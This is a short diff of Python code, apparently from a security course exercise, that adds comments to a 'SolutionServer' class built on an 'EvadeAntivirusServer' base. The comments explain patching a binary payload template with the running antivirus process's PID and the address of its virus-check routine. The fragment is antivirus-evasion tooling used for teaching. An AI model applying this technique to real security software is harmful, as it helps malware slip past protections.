@@ -3,8 +3,10 @@ import evasion
 
 from infosec.core import assemble
 
-
+# unusual value to overide with run time pid of the antivirus
 UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678;
+# unusual value to memory address of the check_if_value
+# to overide with the run time address
 UNUSUAL_MEMORY_ADDRESS_FOR_BIN_PATCH = 0x56565656;
 
 class SolutionServer(evasion.EvadeAntivirusServer):
@@ -21,8 +23,10 @@ class SolutionServer(evasion.EvadeAntivirusServer):
              The bytes of the payload.
         """
         PATH_TO_TEMPLATE = './q2.template'
+        # change to litle endian
         addr_check_if_virus = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE)
         pid_in_bytes = addresses.address_to_bytes(pid)
+        # do the binarty patching for the globals
         with open(PATH_TO_TEMPLATE, "r+b") as read_writer:
             general_payload = read_writer.read()
         
